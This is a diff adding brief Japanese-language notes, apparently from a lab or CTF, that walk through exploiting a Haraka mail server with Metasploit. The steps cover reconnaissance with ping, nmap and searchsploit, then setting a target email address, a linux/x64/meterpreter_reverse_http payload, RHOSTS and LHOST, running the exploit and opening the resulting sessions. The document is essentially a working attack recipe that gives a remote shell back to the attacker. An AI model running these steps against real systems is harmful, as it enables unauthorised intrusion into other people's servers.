@@ -1,0 +1,14 @@
+1) ping
+2) nmap
+3) searcsploit
+4) service postgresql start && msfconsole
+5) search haraka
+6) use 
+7) 以下で設定を行う
+set SRVPORT 9898
+set email_to ターゲットのメールアドレス
+set payload linux/x64/meterpreter_reverse_http
+set RHOSTS
+set LHOST
+exploit
+8) sessionsでセッションを一覧表示し、sessions -i ナンバーでセッションを起動
